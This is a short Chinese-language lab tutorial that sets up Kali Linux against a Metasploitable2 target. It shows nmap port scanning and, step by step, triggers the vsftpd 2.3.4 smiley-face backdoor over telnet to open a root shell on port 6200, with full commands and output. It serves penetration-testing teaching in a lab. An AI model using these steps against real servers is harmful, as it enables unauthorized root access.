# Kali实验环境介绍与使用

攻击机：Kali Linux；靶机：Metasploitable2

靶机系统开放了很多服务，查看系统监听的端口：`netstat -tln`，查看当前系统开放的服务：`rpcinfo -p localhost`

端口扫描工具`nmap`：

扫描target主机的1-1000端口：`nmap -p 1-1000 target`

---

## 通过发笑脸符号给FTP服务获得Shell权限

利用vsftpd漏洞：

``` Bash
root@kali:~# telnet target 21
Trying 192.168.122.102...
Connected to target.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER abc:)
331 Please specify the password.
PASS pass
```

扫描发现6200端口已打开：

``` Bash
root@kali:~# nmap -p 6200 target
...
Host is up (0.0019s latency).
PORT     STATE SERVICE
6200/tcp open  unknown
MAC Address: 52:54:00:1A:11:0B (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```

获取root权限：

``` Bash
root@kali:~# telnet target 6200
Trying 192.168.122.102...
Connected to target.
Escape character is '^]'.
id;
uid=0(root) gid=0(root)
```

